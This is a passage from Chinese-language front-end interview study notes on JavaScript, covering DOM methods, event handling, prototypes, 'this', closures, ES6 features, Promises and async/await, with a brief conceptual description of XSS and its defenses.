方法的输出。\n\n\ndocument.querySelector()\n返回文档中匹配指定的CSS选择器的第一元素\n\n\ndocument.querySelectorAll()\ndocument.querySelectorAll() 是 HTML5中引入的新方法，返回文档中匹配的CSS选择器的所有元素节点列表\n\n\ndocument.readyState\n返回文档状态 (载入中……)\n\n\ndocument.referrer\n返回载入当前文档的文档的 URL。\n\n\ndocument.removeEventListener()\n移除文档中的事件句柄(由 addEventListener() 方法添加)\n\n\ndocument.renameNode()\n重命名元素或者属性节点。\n\n\ndocument.scripts\n返回页面中所有脚本的集合。\n\n\ndocument.strictErrorChecking\n设置或返回是否强制进行错误检查。\n\n\ndocument.title\n返回当前文档的标题。\n\n\ndocument.URL\n返回文档完整的URL\n\n\ndocument.write()\n向文档写 HTML 表达式 或 JavaScript 代码。\n\n\ndocument.writeln()\n等同于 write() 方法，不同的是在每个表达式之后写一个换行符。\n\n\n11、JS中阻止冒泡事件冒泡事件：比如说鼠标点击了一个按钮，同样的事件将会在那个元素的所有祖先元素中被触发。这一过程被称为事件冒泡。\n&lt;div class=\"box\">\n\t&lt;button class=\"btn\">按钮&lt;/button>\n&lt;/div>\n\n&lt;script type=\"text/javascript\">\n\t$('.btn').click(function () &#123;\n\t\talert('按钮被点击了')\n\t&#125;);\n\t$('.box').click(function () &#123;\n\t\talert('box被点击了')\n\t&#125;)\n&lt;/script>\n\n当我们点击按钮后，因为按钮也属于.box元素，所以按钮的父元素.box也会触发点击事件\n$('.btn').click(function (even) &#123;\n\teven.stopPropagation();\n\talert('按钮被点击了');\n&#125;)\n\n\n12、阻止默认事件&lt;a href&#x3D;&quot;javascript:;&quot;&gt;链接&lt;&#x2F;a&gt;\n\n&lt;a href&#x3D;&quot;javascript:void(0);&quot;&gt;链接&lt;&#x2F;a&gt;\n\n\n\n\n&lt;a href&#x3D;&quot;&quot; id&#x3D;&quot;link&quot;&gt;链接&lt;&#x2F;a&gt;\n\n&lt;script&gt;\n        document.getElementById(&quot;link&quot;).onclick &#x3D; function ()&#123;\n            console.log(&quot;666&quot;);\n            return false;\n        &#125;\n&lt;&#x2F;script&gt;\n\n\n\n\n&lt;a href&#x3D;&quot;&quot; id&#x3D;&quot;link&quot;&gt;链接&lt;&#x2F;a&gt;\n\n&lt;script&gt;\n    document.getElementById(&quot;link&quot;).onclick &#x3D; function (e)&#123;\n        console.log(&quot;666&quot;);\n        e.preventDefault();\n    &#125;\n&lt;&#x2F;script&gt;\n\n\n\n\n13、window.locationLocation 对象属性\n\n\n属性\n描述\n\n\n\nhash\n设置或返回从井号 (#) 开始的 URL（锚）。\n\n\nhost\n设置或返回主机名和当前 URL 的端口号。\n\n\nhostname\n设置或返回当前 URL 的主机名。\n\n\nhref\n设置或返回完整的 URL。\n\n\npathname\n设置或返回当前 URL 的路径部分。\n\n\nport\n设置或返回当前 URL 的端口号。\n\n\nprotocol\n设置或返回当前 URL 的协议。\n\n\nsearch\n设置或返回从问号 (?) 开始的 URL（查询部分）。\n\n\nLocation 对象方法\n\n\n属性\n描述\n\n\n\nassign()\n加载新的文档。\n\n\nreload()\n重新加载当前文档。\n\n\nreplace()\n用新的文档替换当前文档。\n\n\n14、原型与原型链原型 prototype原型是函数特有\n&lt;script>\n     function fu()&#123;\n\n     &#125;\n     fu.prototype.name = 'kif'\n     console.log(fu.prototype.name)\n &lt;/script>\n\n挂载在原型上是为了继承(通过new)\n\n\n继承后查找时就近，\n判断属性时继承的还是后天添加的：hasOwnProperty\n\n可以拿到p1的私有属性\n这个方法既不是Persion也不是p1的，而是Persion继承自Object的\n\n\n原型链：_proto_对象，数组，函数等有原型链\n\n预编译function fn(a,c)&#123;\n\tconsole.log(a)\n\tvar a =123;\n\tconsole.log(a)\n\tconsole.log(c)\n\tfunction a()&#123;&#125;\n\tif(false)&#123;\n\t\tvar  d =678\n\t&#125;\n\tconsole.log(d)\n\tconsole.log(b)\n\tvar b =function()&#123;&#125;\n\tconsole.log(b)\n\tfunction c()&#123;&#125;\n\tconsole.log(c)\n&#125;\nfn(2,3)\n\n\n\n 预编译步骤：\n\n创建AO对象\nAO：&#123;\n\n&#125;\n\n\n\n找形参和变量声明\nAO：&#123;\n\ta:undefind\n\tc:undefind\n\td:undefind\n\tbLundefind\n&#125;\n\n\n\n实参与形参相统一\nAO：&#123;\n\ta:2\n\tc:3\n\td:undefind\n\tb:undefind\n&#125;\n\n\n\n找函数申明（会覆盖变量）\nAO：&#123;\n\ta:function a()&#123;&#125;\n\tc:function c()&#123;&#125;\n\td:undefind\n\tb:undefind\n&#125;\n\n注:var b &#x3D;function(){}不是函数声明\n\n逐行执行\nfunction fn(a,c)&#123;\n\tconsole.log(a)&#x2F;&#x2F;function a()&#123;&#125;\n\tvar a &#x3D;123;\n\tconsole.log(a)&#x2F;&#x2F;123\n\tconsole.log(c)&#x2F;&#x2F;function c()&#123;&#125;\n\tfunction a()&#123;&#125;\n\tif(false)&#123;\n\t\tvar  d &#x3D;678\n\t&#125;\n\tconsole.log(d)&#x2F;&#x2F;undefind\n\tconsole.log(b)&#x2F;&#x2F;undefind\n\tvar b &#x3D;function()&#123;&#125;\n\tconsole.log(b)&#x2F;&#x2F;function()&#123;&#125;\n\tfunction c()&#123;&#125;\n\tconsole.log(c)&#x2F;&#x2F;function c()&#123;&#125;\n&#125;\nfn(2,3)\n\n\n\n\n\n\n15、this函数直接调用function get(a)&#123;\n    console.log(a)\n&#125;\nget(&#39;kif&#39;)\n\n\n其中 get(‘kif’) 其实是get.call(window,’kif’ )\n\n即：对象.方法.call(对象，参数)\n对象方法var Persion = &#123;\n    name: 'kif',\n    getName: function (time) &#123;\n        console.log(this.name,time)\n    &#125;\n&#125;\nPersion.getName(299)\n\n\n同理：\nPersion.getName(299)为：Persion.getName.call(Persion,299)\n\n案例：var name = 222\nvar a=&#123;\n    name :111,\n    say:function()&#123;\n        console.log(this.name)\n    &#125;\n&#125;\nvar fun = a.say\nfun()//fun.call(window,)======>222\na.say()//a.say.call(a,)=======>111\nvar b =&#123;\n    name:333,\n    say:function(fun)&#123;\n        fun()//fun.call(window,)//222\n    &#125;\n&#125;\nb.say(a.say)//\nb.say=a.say\nb.say()//b.say.call(b,)=======>333\n\n箭头函数中thisvar x =11\nvar p =&#123;\n    x:22,\n    say:()=>&#123;\n        console.log(this.x)\n    &#125;\n&#125;\np.say()\n\n箭头函数中this固定指向代码块外部\n\nthis指向（普通函数、箭头函数）参考答案：\n普通函数中的this\n\n谁调用了函数或者方法，那么这个函数或者对象中的this就指向谁\n\nlet getThis = function () &#123;\n    console.log(this);\n&#125;\n\nlet obj=&#123;\n    name:\"Jack\",\n    getThis:function()&#123;\n        console.log(this);\n    &#125;\n&#125;\n//getThis()方法是由window在全局作用域中调用的，所以this指向调用该方法的对象，即window\ngetThis();//window\n//此处的getThis()方法是obj这个对象调用的，所以this指向obj\nobj.getThis();//obj\n\n\n匿名函数中的this：匿名函数的执行具有全局性，则匿名函数中的this指向是window，而不是调用该匿名函数的对象；\n\nlet obj = &#123;\n    getThis: function () &#123;\n        return function () &#123;\n            console.log(this);\n        &#125;\n    &#125;\n&#125;\nobj.getThis()(); //window\n\n上面代码中，getThi()方法是由obj调用，但是obj.getThis()返回的是一个匿名函数，而匿名函数中的this指向window，所以打印出window。 如果想在上述代码中使this指向调用该方法的对象，可以提前把this传值给另外一个变量(_this或者that)：\nlet obj = &#123;\n     getThis: function () &#123;\n     //提前保存this指向\n         let _this=this\n         return function () &#123;\n             console.log(_this);\n         &#125;\n     &#125;\n &#125;\n obj.getThis()(); //obj\n\n\n箭头函数中的this\n箭头函数中的this是在函数定义的时候就确定下来的，而不是在函数调用的时候确定的；\n箭头函数中的this指向父级作用域的执行上下文；（技巧：因为javascript中除了全局作用域，其他作用域都是由函数创建出来的，所以如果想确定this的指向，则找到离箭头函数最近的function，与该function平级的执行上下文中的this即是箭头函数中的this）\n箭头函数无法使用apply、call和bind方法改变this指向，因为其this值在函数定义的时候就被确定下来。\n\n\n\n例1：首先，距离箭头函数最近的是getThis(){}，与该函数平级的执行上下文是obj中的执行上下文，箭头函数中的this就是下注释代码处的this，即obj。\nlet obj = &#123;\n    //此处的this即是箭头函数中的this\n    getThis: function () &#123;\n        return  ()=> &#123;\n            console.log(this);\n        &#125;\n    &#125;\n&#125;\nobj.getThis()(); //obj\n\n例2：该段代码中存在两个箭头函数，this找不到对应的function(){}，所以一直往上找直到指向window。\n复制代码\n //代码中有两个箭头函数，由于找不到对应的function，所以this会指向window对象。\nlet obj = &#123;\n     getThis: ()=> &#123;\n         return  ()=> &#123;\n             console.log(this);\n         &#125;\n     &#125;\n &#125;\n obj.getThis()(); //window\n\n\n\n\n\n16、闭包形式：方法里面返回一个方法\nfunction a() &#123;\n        let a = 1;\n        return function () &#123;\n          return a;\n        &#125;;\n      &#125;\n\n\n\n意义：\n延长变量生命周期\n创建私有环境\n\nVue中data也是一个闭包\ndata（）&#123;\n\treturn&#123;\n\t\n\t&#125;\n&#125;\n\n会常驻内存，所以慎用\n17、ES6var let constvar:\n变量提升\nconsole.log(a)//undefined\nvar a = 12\n\n\n\n变量覆盖\nvar a =12\nvar a =23\nconsole.log(a)//23\n\n\n\n没有块级作用域\nfunction fu()&#123;\n\tfor(var i=0;i&lt;3;i++)&#123;\n\t\tconsole.log(i)\n\t&#125;\n\tconsole.log(i)//3\n&#125;\n\nconst:\nconst声明之后必须赋值\n\nconst定义数组，可以对数组修改\nconst arr = [\"sad\", \"666\", \"qewqe\"];\narr.push('5465')\nconsole.log(arr)\n\n解构let a&#x3D;1;\nlet b &#x3D;2;\n\n\n不使用第三个变量互换值\n[a,b]&#x3D;[b,a]\n\n去重let arr=[1,2,3,4,5,2,3,4,2]\nlet ans = [...new Set(arr)]\nconsole.log(ans)\n\npromiselet p = new Promise((resolve, reject) => &#123;\n    console.log(1)\n    resolve()\n    console.log(2)\n&#125;)\np.then(() => &#123;\n    console.log(3)\n&#125;)\nconsole.log(4)\n\n\n构造函数同步执行   &#x2F;&#x2F;1,2\n异步函数异步执行 &#x2F;&#x2F;4,3\n\n18、xssxss（cross-site-scripting）攻击指的是攻击者往 web 页面里插入恶意 html 标签或者 javascript 代码 ；首先代码里对用户输入的地方和变量都需要仔细检查长度和对 “&lt;&gt; , ; . ”等字进行过滤；其次任何内容写到页面之前都必须加 encode，避免不小心把 html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击 ；攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取 cookie 中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器汇总，而不是用户原本以为的信任站点 ；\n19、SEOSEO： Search Engine Optimization, 搜索引擎优化。利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名。目的是让其在行业内占据领先地位，获得品牌收益。很大程度上是网站经营者的一种商业行为，将自己或自己公司的排名前移。SEO是提高你网站排名的一个很有效的方法，这个完善和优化你网站的排名因素的方法就是能影响搜索引擎的排名的算法。 因此，SEO是网络营销策略 （online marketing Digital strategy）和数字营销策略 （Digital Marketing strategy）中很重要的一个环节。SEO使你的网站获取得更多的流量（traffic）同时也可以提高你在搜索引擎的排名。那就意味你可以获取得更多的订单，更多的利润。\n20、数组去重ES6：\nlet  arr = [12, 12, 3, 2, 23, 23, 4, 3, 2];\n\nfunction unique(arr) &#123;\n  return Array.from(new Set(arr));\n&#125;\nconsole.log(unique(arr));\n\n\nlet arr = [12, 12, 34, 21, 34, 21, 5, 2, 5];\nfunction unique(arr) &#123;\n  return [...new Set(arr)];\n&#125;\nconsole.log(unique(arr));\n\n\n\n\nES5：\nlet arr = [12, 12, 3, 4, 4, 3, 5, 23, 12, 3];\nfunction unique(arr) &#123;\n  let Newarr = [];\n  for (let i = 0; i &lt; arr.length; i++) &#123;\n    if (Newarr.indexOf(arr[i]) == -1) &#123;\n      Newarr.push(arr[i]);\n    &#125;\n  &#125;\n  return Newarr;\n&#125;\nconsole.log(unique(arr));\n\n\n\n\n21、数组和伪数组的区别\n定义\n\n\n数组是一个特殊对象,与常规对象的区别：\n当由新元素添加到列表中时，自动更新length属性\n设置length属性，可以截断数组\n从Array.protoype中继承了方法\n属性为’Array’\n\n\n类数组是一个拥有length属性，并且他属性为非负整数的普通对象，类数组不能直接调用数组方法。\n\n\n区别本质：类数组是简单对象，它的原型关系与数组不同。\n\n// 原型关系和原始值转换\nlet arrayLike = &#123;\n    length: 10,\n&#125;;\nconsole.log(arrayLike instanceof Array); // false\nconsole.log(arrayLike.__proto__.constructor === Array); // false\nconsole.log(arrayLike.toString()); // [object Object]\nconsole.log(arrayLike.valueOf()); // &#123;length: 10&#125;\n\nlet array = [];\nconsole.log(array instanceof Array); // true\nconsole.log(array.__proto__.constructor === Array); // true\nconsole.log(array.toString()); // ''\nconsole.log(array.valueOf()); // []\n\n\n类数组转换为数组\n\n\n转换方法\n使用 Array.from()\n使用 Array.prototype.slice.call()\n使用 Array.prototype.forEach() 进行属性遍历并组成新的数组\n\n\n转换须知\n转换后的数组长度由 length 属性决定。索引不连续时转换结果是连续的，会自动补位。\n代码示例\n\n\n\nlet al1 = &#123;\n    length: 4,\n    0: 0,\n    1: 1,\n    3: 3,\n    4: 4,\n    5: 5,\n&#125;;\nconsole.log(Array.from(al1)) // [0, 1, undefined, 3]\n\n\n②仅考虑 0或正整数 的索引\n\n// 代码示例\nlet al2 = &#123;\n    length: 4,\n    '-1': -1,\n    '0': 0,\n    a: 'a',\n    1: 1\n&#125;;\nconsole.log(Array.from(al2)); // [0, 1, undefined, undefined]\n\n\n③使用slice转换产生稀疏数组\n\n// 代码示例\nlet al2 = &#123;\n    length: 4,\n    '-1': -1,\n    '0': 0,\n    a: 'a',\n    1: 1\n&#125;;\nconsole.log(Array.prototype.slice.call(al2)); //[0, 1, empty × 2]\n\n\n使用数组方法操作类数组注意地方\n\n复制代码\nlet arrayLike2 = &#123;\n  2: 3,\n  3: 4,\n  length: 2,\n  push: Array.prototype.push\n&#125;\n\n// push 操作的是索引值为 length 的位置\narrayLike2.push(1);\nconsole.log(arrayLike2); // &#123;2: 1, 3: 4, length: 3, push: ƒ&#125;\narrayLike2.push(2);\nconsole.log(arrayLike2); // &#123;2: 1, 3: 2, length: 4, push: ƒ&#125;\n\n\n\n\n\n22、手写一个发布订阅// 发布订阅中心, on-订阅, off取消订阅, emit发布, 内部需要一个单独事件中心caches进行存储;\ninterface CacheProps &#123;\n  [key: string]: Array&lt;((data?: unknown) => void)>;\n&#125;\n\nclass Observer &#123;\n  private caches: CacheProps = &#123;&#125;; // 事件中心\n  on (eventName: string, fn: (data?: unknown) => void)&#123; // eventName事件名-独一无二, fn订阅后执行的自定义行为\n    this.caches[eventName] = this.caches[eventName] || [];\n    this.caches[eventName].push(fn);\n  &#125;\n\n  emit (eventName: string, data?: unknown) &#123; // 发布 => 将订阅的事件进行统一执行\n    if (this.caches[eventName]) &#123;\n      this.caches[eventName].forEach((fn: (data?: unknown) => void) => fn(data));\n    &#125;\n  &#125;\n\n  off (eventName: string, fn?: (data?: unknown) => void) &#123; // 取消订阅 => 若fn不传, 直接取消该事件所有订阅信息\n    if (this.caches[eventName]) &#123;\n      const newCaches = fn ? this.caches[eventName].filter(e => e !== fn) : [];\n      this.caches[eventName] = newCaches;\n    &#125;\n  &#125;\n\n&#125;\n\n\n\n\n\n\n\n23、介绍下 Set、Map、WeakSet 和 WeakMap 的区别？参考答案：\nSet\n\n成员不能重复；\n只有键值，没有键名，有点类似数组；\n可以遍历，方法有 add、delete、has\n\nWeakSet\n\n成员都是对象（引用）；\n成员都是弱引用，随时可以消失（不计入垃圾回收机制）。可以用来保存 DOM 节点，不容易造成内存泄露；\n不能遍历，方法有 add、delete、has；\n\nMap\n\n本质上是键值对的集合，类似集合；\n可以遍历，方法很多，可以跟各种数据格式转换；\n\nWeakMap\n\n只接收对象为键名（null 除外），不接受其他类型的值作为键名；\n键名指向的对象，不计入垃圾回收机制；\n不能遍历，方法同 get、set、has、delete；\n\n24、简单说说 js 中有哪几种内存泄露的情况\n意外的全局变量；\n闭包；\n未被清空的定时器；\n未被销毁的事件监听；\nDOM 引用；\n\n25、json和xml数据的区别参考答案：\n\n数据体积方面：xml是重量级的，json是轻量级的，传递的速度更快些。\n数据传输方面：xml在传输过程中比较占带宽，json占带宽少，易于压缩。\n数据交互方面：json与javascript的交互更加方便，更容易解析处理，更好的进行数据交互\n数据描述方面：json对数据的描述性比xml较差\nxml和json都用在项目交互下，xml多用于做配置文件，json用于数据交互。\n\n26、JavaScript有几种方法判断变量的类型?参考答案：\n\n使用typeof检测当需要判断变量是否是number, string, boolean, function, undefined等类型时，可以使用typeof进行判断。\n使用instanceof检测instanceof运算符与typeof运算符相似，用于识别正在处理的对象的类型。与typeof方法不同的是，instanceof 方法要求开发者明确地确认对象为某特定类型。\n使用constructor检测constructor本来是原型对象上的属性，指向构造函数。但是根据实例对象寻找属性的顺序，若实例对象上没有实例属性或方法时，就去原型链上寻找，因此，实例对象也是能使用constructor属性的。\n\n27、MathMath 对象方法\n\n\n方法\n描述\n\n\n\nabs(x)\n返回 x 的绝对值。\n\n\nacos(x)\n返回 x 的反余弦值。\n\n\nasin(x)\n返回 x 的反正弦值。\n\n\natan(x)\n以介于 -PI&#x2F;2 与 PI&#x2F;2 弧度之间的数值来返回 x 的反正切值。\n\n\natan2(y,x)\n返回从 x 轴到点 (x,y) 的角度（介于 -PI&#x2F;2 与 PI&#x2F;2 弧度之间）。\n\n\nceil(x)\n对数进行上舍入。\n\n\ncos(x)\n返回数的余弦。\n\n\nexp(x)\n返回 Ex 的指数。\n\n\nfloor(x)\n对 x 进行下舍入。\n\n\nlog(x)\n返回数的自然对数（底为e）。\n\n\nmax(x,y,z,…,n)\n返回 x,y,z,…,n 中的最高值。\n\n\nmin(x,y,z,…,n)\n返回 x,y,z,…,n中的最低值。\n\n\npow(x,y)\n返回 x 的 y 次幂。\n\n\nrandom()\n返回 0 ~ 1 之间的随机数。\n\n\nround(x)\n四舍五入。\n\n\nsin(x)\n返回数的正弦。\n\n\nsqrt(x)\n返回数的平方根。\n\n\ntan(x)\n返回角的正切。\n\n\nMath.max(...[14, 3, 77])  //ES6 的写法，等同于Math.max(14, 3, 77)\n\n\n\n题目：\nvar min = Math.min();\nvar max = Math.max();\nconsole.log(min &lt; max);\n// 写出执行结果，并解释原因\n\n答案false\n解析\n\n按常规的思路，这段代码应该输出 true，毕竟最小值小于最大值。但是却输出 false\nMDN 相关文档是这样解释的\nMath.min 的参数是 0 个或者多个，如果多个参数很容易理解，返回参数中最小的。如果没有参数，则返回 Infinity，无穷大。\n而 Math.max 没有传递参数时返回的是-Infinity.所以输出 false\n\n\n\n28、promise和 async await 区别参考答案：\n\n概念Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大，简单地说，Promise好比容器，里面存放着一些未来才会执行完毕（异步）的事件的结果，而这些结果一旦生成是无法改变的\nasync await也是异步编程的一种解决方案，他遵循的是Generator 函数的语法糖，他拥有内置执行器，不需要额外的调用直接会自动执行并输出结果，它返回的是一个Promise对象。\n\n两者的区别\nPromise的出现解决了传统callback函数导致的“地域回调”问题，但它的语法导致了它向纵向发展行成了一个回调链，遇到复杂的业务场景，这样的语法显然也是不美观的。而async await代码看起来会简洁些，使得异步代码看起来像同步代码，await的本质是可以提供等同于”同步效果“的等待异步返回能力的语法糖，只有这一句代码执行完，才会执行下一句。\nasync await与Promise一样，是非阻塞的。\nasync await是基于Promise实现的，可以说是改良版的Promise，它不能用于普通的回调函数。\n\n\n\n29、 defer和async区别参考答案：\n区别主要在于一个执行时间,defer会在文档解析完之后执行,并且多个defer会按照顺序执行,而async则是在js加载好之后就会执行,并且多个async,哪个加载好就执行哪个\n解析：\n在没有defer或者async的情况下：会立即执行脚本,所以通常建议把script放在body最后\n&lt;script src=\"script.js\">&lt;/script>\n\nasync：有async的话,加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行（异步）。但是多个js文件的加载顺序不会按照书写顺序进行\n&lt;script async src=\"script.js\">&lt;/script>\n\nderer：有derer的话,加载后续文档元素的过程将和 script.js 的加载并行进行（异步），但是 script.js 的执行要在所有元素解析完成之后，DOMContentLoaded 事件触发之前完成,并且多个defer会按照顺序进行加载。\n&lt;script defer src=\"script.js\">&lt;/script>\n\n\n\n30、同步和异步参考答案：\n同步\n\n指在 主线程上排队执行的任务，只有前一个任务执行完毕，才能继续执行下一个任务。\n也就是调用一旦开始，必须这个调用 返回结果(划重点——）才能继续往后执行。程序的执行顺序和任务排列顺序是一致的。\n\n异步\n\n异步任务是指不进入主线程，而进入 任务队列的任务，只有任务队列通知主线程，某个异步任务可以执行了，该任务才会进入主线程。\n每一个任务有一个或多个 回调函数。前一个任务结束后，不是执行后一个任务,而是执行回调函数，后一个任务则是不等前一个任务结束就执行。\n程序的执行顺序和任务的排列顺序是不一致的，异步的。\n我们常用的setTimeout和setInterval函数，Ajax都是异步操作。\n\n31、 实现异步的方法参考答案：\n回调函数（Callback）、事件监听、发布订阅、Promise&#x2F;A+、生成器Generators&#x2F; yield、async&#x2F;await\n\nJS 异步编程进化史：callback -&gt; promise -&gt; generator -&gt; async + await\n\nasync&#x2F;await 函数的实现，就是将 Generator 函数和自动执行器，包装在一个函数里。\n\nasync&#x2F;await可以说是异步终极解决方案了。\n(1) async&#x2F;await函数相对于Promise，优势体现在：\n\n处理 then 的调用链，能够更清晰准确的写出代码\n并且也能优雅地解决回调地狱问题。\n\n当然async&#x2F;await函数也存在一些缺点，因为 await 将异步代码改造成了同步代码，如果多个异步代码没有依赖性却使用了 await 会导致性能上的降低，代码没有依赖性的话，完全可以使用 Promise.all 的方式。\n(2) async&#x2F;await函数对 Generator 函数的改进，体现在以下三点：\n\n内置执行器。 Generator 函数的执行必须靠执行器，所以才有了 co 函数库，而 async 函数自带执行器。也就是说，async 函数的执行，与普通函数一模一样，只要一行。\n更广的适用性。 co 函数库约定，yield 命令后面只能是 Thunk 函数或 Promise 对象，而 async 函数的 await 命令后面，可以跟 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）。\n更好的语义。 async 和 await，比起星号和 yield，语义更清楚了。async 表示函数里有异步操作，await 表示紧跟在后面的表达式需要等待结果。\n\n\nasync&#x2F;await\nAsync&#x2F;Await简介\n 使用async&#x2F;await，你可以轻松地达成之前使用生成器和co函数所做到的工作,它有如下特点：\n\nasync&#x2F;await是基于Promise实现的，它不能用于普通的回调函数。\n\nasync&#x2F;await与Promise一样，是非阻塞的。\n\n\n3. async&#x2F;await使得异步代码看起来像同步代码，这正是它的魔力所在。\n\n一个函数如果加上 async ，那么该函数就会返回一个 Promise\nasync function async1() &#123;\n  return \"1\"\n&#125;\nconsole.log(async1()) // -> Promise &#123;&lt;resolved>: \"1\"&#125;\n\nGenerator函数依次调用三个文件那个例子用async&#x2F;await写法，只需几句话便可实现\nlet fs = require('fs')\nfunction read(file) &#123;\n  return new Promise(function(resolve, reject) &#123;\n    fs.readFile(file, 'utf8', function(err, data) &#123;\n      if (err) reject(err)\n      resolve(data)\n    &#125;)\n  &#125;)\n&#125;\nasync function readResult(params) &#123;\n  try &#123;\n    let p1 = await read(params, 'utf8')//await后面跟的是一个Promise实例\n    let p2 = await read(p1, 'utf8')\n    let p3 = await read(p2, 'utf8')\n    console.log('p1', p1)\n    console.log('p2', p2)\n    console.log('p3', p3)\n    return p3\n  &#125; catch (error) &#123;\n    console.log(error)\n  &#125;\n&#125;\nreadResult('1.txt').then( // async函数返回的也是个promise\n  data => &#123;\n    console.log(data)\n  &#125;,\n  err => console.log(err)\n)\n// p1 2.txt\n// p2 3.txt\n// p3 结束\n// 结束\n\n5.2 Async&#x2F;Await并发请求\n如果请求两个文件，毫无关系，可以通过并发请求\nlet fs = require('fs')\nfunction read(file) &#123;\n  return new Promise(function(resolve, reject) &#123;\n    fs.readFile(file, 'utf8', function(err, data) &#123;\n      if (err) reject(err)\n      resolve(data)\n    &#125;)\n  &#125;)\n&#125;\nfunction readAll() &#123;\n  read1()\n  read2()//这个函数同步执行\n&#125;\nasync function read1() &#123;\n  let r = await read('1.txt','utf8')\n  console.log(r)\n&#125;\nasync function read2() &#123;\n  let r = await read('2.txt','utf8')\n  console.log(r)\n&#125;\nreadAll() // 2.txt 3.txt\n\n\n\n\n\n32、 promise的介绍与使用Promise 介绍：\nES6中的Promise 是异步编程的一种方案。从语法上讲，Promise 是一个对象，它可以获取异步操作的消息。\nPromise对象, 可以将异步操作以同步的流程表达出来。使用 Promise 主要有以下好处：\n\n可以很好地解决回调地狱的问题（避免了层层嵌套的回调函数）。\n语法非常简洁。Promise 对象提供了简洁的API，使得控制异步操作更加容易。\n\nPromise 使用：\n语法\nvar promise = new Promise((resolve, reject) => &#123;/* executor函数 */\n    // ... some code\n    if (/* 异步操作成功 */)&#123;\n        resolve(value);\n    &#125; else &#123;\n        reject(error);\n    &#125;\n&#125;);\npromise.then((value) => &#123;\n    //success\n&#125;, (error) => &#123;\n    //failure\n&#125;)\n\n\n参数executor 函数在Promise构造函数执行时同步执行，被传递 resolve 和 reject 函数（executor函数在Promise构造函数返回新建对象前被调用）。executor 内部通常会执行一些异步操作，一旦完成，可以调用resolve函数来将promise状态改成fulfilled(完成)，或者将promise的状态改为rejected(失败)。如果在executor函数中抛出一个错误，那么该promise 状态为rejected。executor函数的返回值被忽略。\n简单使用\n\nfunction timeout(ms) &#123;\n    return new Promise((resolve, reject) => &#123;\n        setTimeout(resolve, ms, 'done');\n    &#125;);\n&#125;\n\ntimeout(2000).then((value) => &#123;\n    console.log(value); //done\n&#125;);\n\n原型方法\nPromise.prototype.then(onFulfilled, onRejected)\n\n语法p.then(onFulfilled, onRejected);p.then((value) =&gt; &#123;// fulfillment&#125;, (reason) =&gt; &#123;// rejection&#125;);\n\n含义为 Promise实例添加状态改变时的回调函数。then方法的第一个参数是resolved状态的回调函数，第二个参数（可选）是rejected状态的回调函数。\n\n链式操作then方法返回的是一个新的promise，因此可以采用链式写法，即then方法后面再调用另一个then方法。\nnew Promise(resolve => &#123;\n    resolve(1);\n&#125;)\n    .then(result => console.log(result)) //1\n    .then(result => &#123;\n        console.log(result);              //undefined\n        return 2;\n    &#125;)\n    .then(result => &#123;\n        console.log(result);             //2\n        throw new Error(\"err\");\n    &#125;)\n    .then((result) =>&#123;\n        console.log(result);            \n    &#125;, (err)=>&#123;\n        console.log(err);                //Error: err\n        return 3;\n    &#125;)\n    .then((result) => &#123;\n        console.log(result);            //3\n    &#125;)\n\n注意：①不管是then方法的onfulfilled函数参数执行还是onrejected（可选参数）函数参数执行，then方法返回的都是一个新的Promise对象，都可以继续采用链式写法调用另一个then方法。②Promise.prototype.catch()方法返回的也是一个Promise对象。then方法和catch方法可以链式操作。\n\n返回值then方法返回一个Promise，而它的行为与then中的被调用的回调函数(onfulfilled函数&#x2F;onrejected函数)的返回值有关。(1) 如果then中的回调函数返回一个值，那么then返回的Promise将会成为接受状态，并且将返回的值作为接受状态的回调函数的参数值。\nnew Promise((resolve, reject) => &#123;\n    reject();\n&#125;)\n.then( () => 99, () => 42 )\n.then( result => console.log(result)); // 42\n\n(2) 如果then中的回调函数抛出一个错误，那么then返回的Promise将会成为拒绝状态，并且将抛出的错误作为拒绝状态的回调函数的参数值。\nnew Promise((resolve, reject) => &#123;\n    resolve();\n&#125;)\n    .then( () => &#123;throw new Error('err')&#125;, () => &#123;&#125;)\n    .then( () => &#123;&#125;, (err) => &#123;console.log(err)&#125;); //Error: err\n\n(3) 如果then中的回调函数返回一个已经是接受状态的Promise，那么then返回的Promise也会成为接受状态，并且将那个Promise的接受状态的回调函数的参数值作为该被返回的Promise的接受状态回调函数的参数值。\nnew Promise((resolve, reject) => &#123;\n    resolve();\n&#125;)\n    .then( () => &#123;\n        return new Promise(resolve => resolve('ok'));\n    &#125;)\n    .then( (result) => &#123;console.log(result)&#125;); //ok\n\n(4) 如果then中的回调函数返回一个已经是拒绝状态的Promise，那么then返回的Promise也会成为拒绝状态，并且将那个Promise的拒绝状态的回调函数的参数值作为该被返回的Promise的拒绝状态回调函数的参数值。\nnew Promise((resolve, reject) => &#123;\n    resolve();\n&#125;)\n    .then( () => &#123;\n        return new Promise((resolve, reject) => &#123;\n           reject(new Error('err'));\n        &#125;);\n    &#125;)\n    .then( () => &#123;&#125;, (err) => &#123;console.log(err)&#125;); //Error: err\n\n(5) 如果then中的回调函数返回一个未定状态（pending）的Promise，那么then返回Promise的状态也是未定的，并且它的终态与那个Promise的终态相同；同时，它变为终态时调用的回调函数参数与那个Promise变为终态时的回调函数的参数是相同的。\nnew Promise((resolve, reject) => &#123;\n    resolve();\n&#125;)\n.then(() => &#123;\n    return new Promise(resolve => &#123;\n        setTimeout(resolve, 2000, 'ok');\n    &#125;);\n&#125;)\n.then( (result) => &#123;console.log(result)&#125;); //ok\n\n注意：这里是then方法中被调用回调函数的返回值与then方法返回的Promise对象状态之间的关系。\n\n\nPromise.prototype.catch(onRejected)\n\n语法\np.catch(onRejected);\n\np.catch(function(reason) &#123;\n    // 拒绝\n&#125;);\n\n含义Promise.prototype.catch方法是.then(null, rejection)的别名，用于指定发生错误时的回调函数，返回一个新的promise对象。\n\n用法\nconst p = new Promise((resolve,reject) => &#123;\n    return reject(new Error('err')); //reject方法的作用，等同于抛出错误\n    //throw new Error('err');\n&#125;);\n\np.then(null, (err) => &#123;\n    console.log(err);  //Err: err\n&#125;);\n\n//--------等价写法---------\np.catch(err => &#123;\n    console.log(err); //Err: err\n&#125;)\n\n注意：由于.catch方法是.then(null, rejection)的别名，故.then中的链式操作(3)、返回值(4)等语法在.catch中都适用。\n\n一般总是建议，Promise 